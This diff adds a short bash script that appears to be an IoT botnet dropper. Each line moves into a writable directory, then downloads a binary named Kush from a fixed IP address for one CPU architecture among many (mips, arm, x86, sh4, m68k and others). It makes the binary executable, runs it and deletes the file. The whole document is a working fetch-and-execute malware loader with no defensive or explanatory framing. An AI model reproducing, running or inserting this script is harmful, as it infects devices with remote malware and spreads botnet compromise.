@@ -1,0 +1,12 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.mips; curl -O http://212.237.21.222/Kush.mips; chmod +x Kush.mips; ./Kush.mips; rm -rf Kush.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.mpsl; curl -O http://212.237.21.222/Kush.mpsl; chmod +x Kush.mpsl; ./Kush.mpsl; rm -rf Kush.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.sh4; curl -O http://212.237.21.222/Kush.sh4; chmod +x Kush.sh4; ./Kush.sh4; rm -rf Kush.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.x86; curl -O http://212.237.21.222/Kush.x86; chmod +x Kush.x86; ./Kush.x86; rm -rf Kush.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.arm; curl -O http://212.237.21.222/Kush.arm; chmod +x Kush.arm; ./Kush.arm; rm -rf Kush.arm
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.pcc; curl -O http://212.237.21.222/Kush.pcc; chmod +x Kush.pcc; ./Kush.pcc; rm -rf Kush.pcc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.i686; curl -O http://212.237.21.222/Kush.i686; chmod +x Kush.i686; ./Kush.i686; rm -rf Kush.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.i586; curl -O http://212.237.21.222/Kush.i586; chmod +x Kush.i586; ./Kush.i586; rm -rf Kush.i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.m68k; curl -O http://212.237.21.222/Kush.m68k; chmod +x Kush.m68k; ./Kush.m68k; rm -rf Kush.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.spc; curl -O http://212.237.21.222/Kush.spc; chmod +x Kush.spc; ./Kush.spc; rm -rf Kush.spc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.21.222/Kush.pcc; curl -O http://212.237.21.222/Kush.pcc; chmod +x Kush.pcc; ./Kush.pcc; rm -rf Kush.pcc
